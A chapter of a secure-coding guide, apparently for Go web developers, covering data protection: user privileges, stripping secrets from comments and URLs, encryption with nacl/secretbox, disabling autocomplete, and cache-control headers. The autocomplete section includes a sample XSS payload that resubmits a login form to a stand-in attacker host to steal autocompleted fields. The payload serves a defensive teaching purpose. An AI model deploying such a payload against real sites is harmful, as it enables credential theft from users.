Data Protection
===============

Nowadays, one of the most important things in security in general is data
protection. You don't want something like:

![All your data are belong to us](files/cB52MA.jpeg)

In a nutshell, data from your web application needs to be protected, so in this
section we will take a look at the different ways to secure it.

One of the first things you should take care is creating and implementing the
right privileges for each user and restrict them to only the functions they
really need.

For example, consider a simple online store with the following user roles:

* _Sales user_: Permission only to view catalog
* _Marketing user_: Allowed to check statistics
* _Developer_: Allowed to modify pages and web application options

Also, in the system configuration (aka webserver), you should define the right
permissions.

The main thing is to define the right role for each user - web or system.

Role separation and access controls are further discussed in
the [Access Control][1] section.

## Remove sensitive information

Temporary and cache files which contain sensitive information should be removed
as soon as they're not needed. If you still need some of them, move them to
protected areas or encrypt them.

### Comments

Sometimes developers leave comments like _To-do lists_ in the source-code, and
sometimes, in the worst case scenario, developers may leave credentials.

```go
// Secret API endpoint - /api/mytoken?callback=myToken
fmt.Println("Just a random code")
```

In the above example, the developer has a endpoint in a comment which, if not
well protected, could be used by a malicious user.

### URL

Passing sensitive information using the HTTP GET method leaves the web
application vulnerable because:

1. Data could be intercepted if not using HTTPS by MITM attacks.
2. Browser history stores the user's information. If the URL has
   session IDs, pins or tokens that don't expire (or have low entropy),
   they can be stolen.

```go
req, _ := http.NewRequest("GET", "http://mycompany.com/api/mytoken?api_key=000s3cr3t000", nil)
```

If you web application tries to get information from a third-party website
using your ```api_key```, it could be stolen if anyone is listening within your
network. This is due to the lack of HTTPS and the parameters being passed
through GET.

Also, if your web application has links to the example site:

```
http://mycompany.com/api/mytoken?api_key=000s3cr3t000
```

It will be stored in your browser history so, again, it can be stolen.

Solutions should always use HTTPS. Furthermore, try to pass the parameters using
the POST method and, if possible, use one time only session IDs or token.

### Information is power

You should always remove application and system documentation on the production
environment. Some documents could disclose versions, or even functions that could
be used to attack your web application (e.g. Readme, Changelog, etc.).

As a developer, you should allow the user to remove sensitive information that
is no longer used. Imagine that the user has expired credit cards on
his account and wants to remove them - your web application should allow it.

All of the information that is no longer needed must be deleted from the
application.

#### Encryption is the key

Every highly sensitive information should be encrypted in your web application.
Use the military-grade [encryption available in Go][2]; for more information,
see the [Cryptographic Practices][3] section.

If you need to implement your code elsewhere, just build and share the
binary - there's no bulletproof solution to prevent reverse engineering.

Getting different permissions for accessing the code and limiting the access
for your source-code is the best approach.

Do not store passwords, connection strings (see example for how to secure database
connection strings on [Database Security][4] section) or other sensitive
information in clear text or in any non-cryptographically secure manner on the
client side.
This includes embedding in insecure formats (e.g. Adobe flash or compiled code).

A small example of encryption in Go using and external package
`golang.org/x/crypto/nacl/secretbox`:

```go
// Load your secret key from a safe place and reuse it across multiple
// Seal calls. (Obviously don't use this example key for anything
// real.) If you want to convert a passphrase to a key, use a suitable
// package like bcrypt or scrypt.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
copy(secretKey[:], secretKeyBytes)

// You must use a different nonce for each message you encrypt with the
// same key. Since the nonce here is 192 bits long, a random value
// provides a sufficiently small probability of repeats.
var nonce [24]byte
if _, err := rand.Read(nonce[:]); err != nil {
    panic(err)
}

// This encrypts "hello world" and appends the result to the nonce.
encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

// When you decrypt, you must use the same nonce and key you used to
// encrypt the message. One way to achieve this is to store the nonce
// alongside the encrypted message. Above, we stored the nonce in the first
// 24 bytes of the encrypted text.
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```

Output will be:

```
hello world
```

## Disable what you don't need

Another simple and efficient way to mitigate attack vectors is to guarantee that
any unnecessary applications or services are disabled in your systems.

### Autocomplete

According to [Mozilla documentation][1], you can disable autocompletion in the
entire form by using:

```html
<form method="post" action="/form" autocomplete="off">
```

Or a specific form element:

```html
<input type="text" id="cc" name="cc" autocomplete="off">
```

This is especially useful for disabling autocomplete on login forms. Imagine a
case where a XSS vector is present in the login page.
If the malicious user creates a payload like:

```javascript
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```

It will send the autocomplete form fields to the `attacker_site.com`.

### Cache

Cache control in pages that contain sensitive information should be disabled.

This can be achieved by setting the corresponding header flags, as shown in the
following snippet:

```go
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```

The `no-cache` value tells the browser to revalidate with the server before
using any cached response. It does not tell the browser to _not cache_.

On the other hand, `no-store` value is really - _Hey stop caching!_ - and
must not store any part of the request or response.

The `Pragma` header is there to support HTTP/1.0 requests.

[1]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
[2]: https://godoc.org/golang.org/x/crypto
[3]: /cryptographic-practices/README.md
[4]: /database-security/README.md
